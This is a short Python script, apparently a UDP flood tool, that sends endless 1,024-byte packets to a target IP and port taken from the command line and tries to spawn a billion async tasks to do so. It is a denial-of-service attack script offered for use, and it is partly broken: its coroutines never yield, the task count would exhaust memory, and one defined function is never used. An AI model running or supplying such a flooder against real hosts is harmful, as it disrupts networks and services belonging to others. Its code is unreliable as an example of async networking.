import socket
import asyncio
import sys

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Craft a payload (you can customize this)
payload = b"X" * 1024  # Replace "X" with your desired payload

# Function to send UDP packets asynchronously
async def send_packets(target_ip, target_port):
    while True:
        sock.sendto(payload, (target_ip, target_port))

# Function to collect output (optional)
async def collect_output():
    while True:
        data, addr = sock.recvfrom(1024)
        print(f"Received data from {addr[0]}:{addr[1]} - {data.decode()}")

async def main():
    if len(sys.argv) < 3:
        print("Usage: python script.py <target_ip> <target_port>")
        return
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])

    # Create tasks for sending packets
    tasks = [send_packets(target_ip, target_port) for _ in range(1000000000)]  # A billion tasks

    await asyncio.gather(*tasks)

# Run the main function
asyncio.run(main())
